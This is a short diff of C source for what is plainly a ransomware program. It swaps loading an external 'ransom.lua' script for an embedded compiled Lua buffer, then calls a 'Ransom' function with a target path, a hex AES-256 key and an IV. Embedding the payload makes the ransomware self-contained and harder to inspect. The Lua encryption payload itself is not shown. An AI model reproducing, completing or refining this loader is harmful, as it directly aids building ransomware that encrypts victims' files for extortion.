@@ -43,16 +43,16 @@ int main (int argc, char **argv) {
     luaopen_lfs(L);
     luaopen_netlib(L);
     luaopen_ransomlib(L);
-    if (luaL_dofile(L, "ransom.lua") != LUA_OK)
+    if (luaL_loadbuffer(L, (const char*)luac_out, luac_out_len, "buffer lua") != 0)
         return printf("couldnt load: ransom.lua\n");
 
+    lua_call(L, 0, 0);
     lua_getglobal(L, "Ransom");
-    if (lua_isfunction(L, -1)) {
-        lua_pushstring(L, target);
-        lua_pushlstring(L, hex_key, AES_256_KEY_SIZE*2);
-        lua_pushlstring(L, hex_iv, AES_BLOCK_SIZE*2);
-        lua_call(L, 3, 0);
-    }
+    lua_pushstring(L, target);
+    lua_pushlstring(L, hex_key, AES_256_KEY_SIZE*2);
+    lua_pushlstring(L, hex_iv, AES_BLOCK_SIZE*2);
+    if (lua_pcall(L, 3, 0, 0) != 0)
+        return printf("[-] %s", lua_tostring(L, -1));
 
     printf("[+] Done\n");
 }
